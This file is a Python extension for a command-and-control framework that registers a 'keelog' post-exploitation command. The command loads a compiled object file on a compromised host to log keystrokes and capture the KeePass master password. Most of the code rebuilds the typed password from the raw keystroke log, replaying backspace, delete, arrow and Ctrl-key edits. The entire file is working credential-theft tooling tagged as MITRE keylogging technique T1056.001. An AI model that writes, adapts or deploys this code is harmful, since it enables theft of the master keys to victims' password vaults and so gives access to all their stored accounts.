import conquest
import os.path
import re

ASYNC_DLL = conquest.resources_root() + "/async-bof-loader/dist/async-bof.dll"
EXPORT_FUNC = "Run"
SCRIPT_DIR = os.path.dirname(__file__)

if not os.path.exists(ASYNC_DLL):
    raise FileNotFoundError(f"Async BOF DLL not found: {ASYNC_DLL}")

def _keelogOutput(agentId, output):
    conquest.output(agentId, output)
    
    prefix = "[+] Captured keystrokes: "
    if prefix not in output:
        return

    # Reconstruct master password from raw keystrokes    
    raw = output[output.index(prefix) + len(prefix):]
    buf = []
    cursor = 0
    i = 0

    while i < len(raw):
        if raw[i] == '[':
            end = raw.find(']', i)
            if end == -1:
                buf.insert(cursor, raw[i])
                cursor += 1
                i += 1
                continue
            token = raw[i:end+1]
            if token == '[BACK]':
                if cursor > 0:
                    buf.pop(cursor - 1)
                    cursor -= 1
            elif token == '[CTRL+BACK]':
                while cursor > 0 and buf[cursor - 1] == ' ':
                    buf.pop(cursor - 1)
                    cursor -= 1
                while cursor > 0 and buf[cursor - 1] != ' ':
                    buf.pop(cursor - 1)
                    cursor -= 1
            elif token == '[DEL]':
                if cursor < len(buf):
                    buf.pop(cursor)
            elif token == '[CTRL+DEL]':
                while cursor < len(buf) and buf[cursor] == ' ':
                    buf.pop(cursor)
                while cursor < len(buf) and buf[cursor] != ' ':
                    buf.pop(cursor)
            elif token == '[LEFT]':
                if cursor > 0:
                    cursor -= 1
            elif token == '[CTRL+LEFT]':
                while cursor > 0 and buf[cursor - 1] == ' ':
                    cursor -= 1
                while cursor > 0 and buf[cursor - 1] != ' ':
                    cursor -= 1
            elif token == '[RIGHT]':
                if cursor < len(buf):
                    cursor += 1
            elif token == '[CTRL+RIGHT]':
                while cursor < len(buf) and buf[cursor] == ' ':
                    cursor += 1
                while cursor < len(buf) and buf[cursor] != ' ':
                    cursor += 1
            elif token == '[HOME]':
                cursor = 0
            elif token == '[END]':
                cursor = len(buf)
            i = end + 1
            if i < len(raw) and raw[i] == '\n':
                i += 1
        else:
            buf.insert(cursor, raw[i])
            cursor += 1
            i += 1

    conquest.output(agentId, f"[+] Reconstructed master password: {''.join(buf).strip()}")

cmd_keelog = (
    conquest.createCommand(name="keelog", description="Capture KeePass master password (async).", example="keelog",
                            message="Tasked agent to capture KeePass master password.", mitre=["T1056.001"])
            .setHandler(lambda agentId, cmdline, args: (
                bof := os.path.join(SCRIPT_DIR, "keelog.x64.o"),
                conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, "")}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
            .setOutputHandler(_keelogOutput)
).registerToGroup("post-exploitation")